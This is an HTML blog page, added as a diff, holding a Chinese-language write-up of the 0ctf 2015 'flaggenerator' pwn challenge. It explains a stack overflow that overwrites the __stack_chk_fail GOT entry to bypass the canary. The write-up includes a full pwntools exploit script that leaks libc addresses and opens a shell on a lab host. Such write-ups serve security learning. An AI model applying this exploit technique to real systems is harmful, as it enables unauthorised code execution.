@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>0ctf 2015 flaggenerator | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="(绕过canary类型题目)
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA
+提取码：4olb
+1.pwn环境搭建，查看保护机制，运行ida*32远程调试文件
+
+
+
+2.ida*32..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">0ctf 2015 flaggenerator</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>(绕过canary类型题目)<br>
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb</p>
+<p>1.pwn环境搭建，查看保护机制，运行ida*32远程调试文件<br>
+<img src="https://closefrom.github.io/post-images/1615580109502.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580116122.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580124328.png" alt="" loading="lazy"></p>
+<p>2.ida*32打开程序分析：<br>
+<img src="https://closefrom.github.io/post-images/1615580133807.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580142792.png" alt="" loading="lazy"><br>
+7个case，分别为上面图片的描述功能。<br>
+出现漏洞的地方在选项4<br>
+<img src="https://closefrom.github.io/post-images/1615580152802.png" alt="" loading="lazy"><br>
+将选项1读入的flag，传入到选项4的sub_80488C6函数中，flag中只要含有h或者H字符就会变成三个字符-&gt; &quot;1-1&quot; ，可以利用这个进行栈溢出。然后函数结尾还有strcpy，将变换后的src字符串，拷贝到dest指向的内存位置。然后由于栈溢出覆盖了canary，所以函数最后会触发stack_chk_fail函数。<br>
+可以利用栈溢出，strcpy，和出发的stack_chk_fail函数，以及搜集的ROPgadget，进行getshell</p>
+<p>3.信息搜集：<br>
+<img src="https://closefrom.github.io/post-images/1615580166695.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580173921.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580182384.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580189339.png" alt="" loading="lazy"></p>
+<pre style="white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><code>
+from pwn import *
+
+context.binary = './flagen'
+file_elf = ELF('./flagen')
+libc_elf = ELF('libc.so.6')
+puts_add = file_elf.symbols['puts']
+puts_got = file_elf.got['puts']
+stack_chk_fail_got = file_elf.got['__stack_chk_fail']
+libc_system_add = libc_elf.symbols['system']
+libc_gets_add = libc_elf.symbols['gets']
+libc_puts_add = libc_elf.symbols['puts']
+ret_add = 0x0804846a
+buf1 = 0x0804b6c0 
+buf2 = 0x0804b7c0
+#可写的地址最后两位十六进制不要是00！
+pop_ebx_ret = 0x08048481
+leave_ret = 0x080485d8
+readn_add = 0x080486cb
+
+link = remote("192.168.93.137","6666")
+payload = p32(ret_add) + 'h' * 88 #长为4+88*3=268=0x10c 
+payload += p32(buf1)
+payload += p32(pop_ebx_ret)
+payload += p32(stack_chk_fail_got)
+payload += p32(puts_add)
+payload += p32(pop_ebx_ret)
+payload += p32(puts_got)
+payload += p32(readn_add)
+payload += 'A' * 0x4
+payload += p32(buf1+4)
+payload += p32(0x23333333)
+#若泄露地址后，无法返回到一个含有栈溢出的地址
+#可以考虑构造读入函数以及ROGgadget，来转移栈执行其他函数
+link.recvuntil("choice: ")
+link.sendline('1')
+link.sendline(payload)
+link.recvuntil("choice: ")
+link.sendline('4')
+leak_puts_add = u32(link.recv(4)) #将打印的puts的got 的四个字节u32
+py_add = leak_puts_add - libc_puts_add
+system_add = libc_system_add + py_add
+gets_add = libc_gets_add + py_add
+payload2 = p32(gets_add) + p32(system_add) + p32(buf2) + p32(buf2)
+link.send(payload2)
+link.send('/bin/sh\x00')
+link.interactive()
+</code></pre>
+<p>exp大致流程：<br>
+1.先进入1选项，输入flag，</p>
+<p>2.然后进入4选项， 将输入的flag中的h变成1-1字符串，造成溢出，</p>
+<p>3.在4选项进入的函数结尾处，strcpy，将ebp+8位置指向堆的指针地址，存到dest，<br>
+将 从输入的flag中变化后的字符串 的起始地址传到src处，<br>
+将src处字符串拷贝到dest处<br>
+由于 可以将h字符变长造成栈溢出，所以可以覆盖ebp+8位置的地址，<br>
+覆盖为stack_chk_fail的got地址。<br>
+然后strcpy将src处的字符串拷贝到stack_chk_fail的got地址处。</p>
+<p>4.到函数最后，检查canary值，发现不正确，就调用stack_chk_fail函数（retn指令）<br>
+此时的esp指向是stack_chk_fail的got地址，执行完retn指令后，<br>
+就是函数最后的leave；retn（mov esp，ebp；pop ebp；pop eip）指令，执行完之后，<br>
+ebp=buf（一个可写的地址），esp指向ret（pop ebx；rent），然后执行pust函数<br>
+输出read函数的got值，并且返回到readn函数的起始位置，向一个buf+4的地址写入数据<br>
+（gets+system+buf2+buf2）  buf2-&gt;(一个可写的地址)<br>
+执行完readn函数后，<br>
+esp指向（leave;ret）指令。然后开始执行。<br>
+执行完 leave 后，esp指向buf+4位置，ebp为buf位置的值，<br>
+执行完retn后，eip指向buf+4位置的地址；<br>
+即：gets函数，在buf2处写入字符串/bin/sh\x00，<br>
+然后调用system函数，传入/bin/sh\x00<br>
+进行getshell<br>
+<img src="https://closefrom.github.io/post-images/1615580226865.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/redhat-2017-pwn5/">
+                  <h3 class="post-title">
+                    RedHat 2017-pwn5
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
